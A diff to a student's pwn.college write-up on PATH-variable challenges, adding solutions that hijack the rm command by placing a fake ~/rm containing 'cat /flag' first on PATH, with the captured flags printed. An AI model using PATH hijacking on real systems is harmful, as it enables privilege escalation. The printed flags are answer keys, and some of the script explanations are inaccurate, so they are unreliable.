@@ -34,6 +34,14 @@ Invoking 'win'....
 Congratulations! You properly set the flag and 'win' has launched!
 pwn.college{AfQ1UBZwR0gbfQMzLp2l8zHovP8.dVzNyUDLykTN0czW}
 ```
+or we can overwrite path without removing the directories that were already there by adding the new directory to the existing PATH variable inside the new PATH 
+```bash
+hacker@path~setting-path:~$ PATH=$PATH:/challenge/more_commands/
+hacker@path~setting-path:~$ /challenge/run
+Invoking 'win'....
+Congratulations! You properly set the flag and 'win' has launched!
+pwn.college{AfQ1UBZwR0gbfQMzLp2l8zHovP8.dVzNyUDLykTN0czW}
+```
 ## Thought Process 
 **Adding Commands** : We can add our own scripts and commands in the path variables.
 ### Solving 
@@ -53,19 +61,26 @@ pwn.college{o5WB2f0rhKm6sq5w2ggfv_1QmsP.dZzNyUDLykTN0czW}
 **Hijacking Commands** 
 
 ### Solving 
-This was tough to solve, it took me some time and initially i tried many ways involving creating a shell script using nano for a fake rm command etc. <br>
-I took some friend's help discussed and found a solution. First created a file named rm using touch in the current directory. Then added the command cat /flag<br>
-to the rm script using echo "cat /flag" > rm, which means that when rm is executed, it will instead output the contents of /flag. Then modified the path to <br>
-make sure that the system will first search for the rm command in the home directory rather than the system directories which is why the rm i created will be <br>
-executed and hence read the flag rather than the defualt system rm command which would have delete the flag instead. 
+Here using the echo command im redirecting 'cat /flag' to the rm command in my home directory and then using chmod making it executable. Then setting a new path variable im updating it so that it will first search for the commands in my home directory rather than the directories where default rm exists. When the /challenge/run program invokes the rm command it will look for the command in the directories in the PATH variable but since i set it that way it will look into the home directory first hence, it will execute the rm command i set which will read cat /flag hence giving the contents of the flag.
 #### Challenge 4
 ```bash
-hacker@path~hijacking-commands:~$ touch rm
-hacker@path~hijacking-commands:~$ echo "cat /flag" > rm
-hacker@path~hijacking-commands:~$ PATH="$HOME:$PATH"
-hacker@path~hijacking-commands:~$ /challenge/run
+hacker@path~hijacking-commands:~$ echo 'cat /flag' > ~/rm
+hacker@path~hijacking-commands:~$ chmod +x ~/rm
+hacker@path~hijacking-commands:~$ PATH="$HOME:$PATH" /challenge/run
 Trying to remove /flag...
 Found 'rm' command at /home/hacker/rm. Executing!
 pwn.college{0DKUjJS_4JGvED8wHI30wdmn8tb.ddzNyUDLykTN0czW}
 ```
+I further tried solving this a few times and i think a better way would be to create a script instead like so :
+```bash
+hacker@path~hijacking-commands:~$ echo '#!/bin/sh\ncat /flag' > ~/rm
+hacker@path~hijacking-commands:~$ chmod +x ~/rm
+hacker@path~hijacking-commands:~$ PATH="$HOME:$PATH" /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{0DKUjJS_4JGvED8wHI30wdmn8tb.ddzNyUDLykTN0czW}
+```
+The command echo '#!/bin/sh\ncat /flag' > ~/rm is used to create a shell script in the home directory. #!/bin/sh: This is called a shebang. It tells the system that the file should be executed using the /bin/sh shell, which is essential for making the script executable.
+cat /flag: This command, written on the second line, tells the shell to display the contents of the /flag file.
+
 
